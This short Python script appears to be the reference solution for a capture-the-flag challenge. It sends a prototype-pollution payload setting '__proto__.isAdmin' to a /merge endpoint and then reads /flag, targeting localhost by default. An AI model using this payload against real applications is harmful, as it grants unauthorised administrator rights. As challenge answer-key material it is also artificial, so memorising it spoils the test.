"""Reference exploit — prototype pollution chain."""
import json, urllib.request, sys


def solve(target: str = "http://127.0.0.1:3000") -> str:
    body = json.dumps({"__proto__": {"isAdmin": True}}).encode()
    req = urllib.request.Request(target + "/merge", data=body,
                                 headers={"Content-Type": "application/json"})
    urllib.request.urlopen(req, timeout=5).read()
    with urllib.request.urlopen(target + "/flag", timeout=5) as r:
        return r.read().decode()


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:3000"
    print(solve(target))
